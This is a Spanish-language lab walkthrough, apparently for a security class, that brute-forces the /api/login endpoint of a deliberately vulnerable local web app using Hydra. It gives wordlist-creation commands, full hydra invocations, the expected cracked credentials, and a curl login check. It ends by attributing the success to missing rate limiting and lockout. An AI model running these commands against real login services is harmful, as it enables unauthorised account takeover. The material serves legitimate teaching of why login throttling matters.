# Ataque 3 - Brute Force con Hydra
## Version vulnerable - Puerto 3000

Host objetivo:

```text
192.168.0.10
```

URL vulnerable:

```text
http://192.168.0.10:3000
```

Endpoint de login:

```text
/api/login
```

---

## 1. Verificar que Hydra esta disponible

```bash
hydra -h
```

---

## 2. Verificar que la version vulnerable responde

```bash
curl -i "http://192.168.0.10:3000/login.html"
```

---

## 3. Crear wordlist de contrasenas

```bash
echo -e "abc123\npassword\n123456\nadmin123\nqwerty\nletmein\nsegura456" > /tmp/demo-passwords.txt
```

Verificar:

```bash
cat /tmp/demo-passwords.txt
```

---

## 4. Crear lista de usuarios

```bash
echo -e "admin\njlopez\nmgarcia\ncperez\namoreno" > /tmp/users.txt
```

Verificar:

```bash
cat /tmp/users.txt
```

---

## 5. Ataque a un usuario especifico

```bash
hydra -I \
  -l admin \
  -P /tmp/demo-passwords.txt \
  192.168.0.10 \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:1=401:S=role" \
  -s 3000 \
  -t 4 \
  -V \
  -f
```

Resultado esperado:

```text
login: admin   password: admin123
```

---

## 6. Ataque a multiples usuarios

```bash
hydra -I \
  -L /tmp/users.txt \
  -P /tmp/demo-passwords.txt \
  192.168.0.10 \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:1=401:S=role" \
  -s 3000 \
  -t 4 \
  -V
```

Resultado esperado:

```text
login: admin    password: admin123
login: jlopez   password: password
login: mgarcia  password: segura456
login: cperez   password: qwerty
login: amoreno  password: letmein
```

---

## 7. Validar credencial encontrada con curl

```bash
curl -i -X POST "http://192.168.0.10:3000/api/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123"
```

Resultado esperado:

```json
{"success":true,"role":"admin","username":"admin"}
```

---

## Conclusion

El ataque de fuerza bruta fue exitoso contra la version vulnerable porque el endpoint `/api/login` no implementa limite de intentos, bloqueo de cuenta ni proteccion contra ataques automatizados.
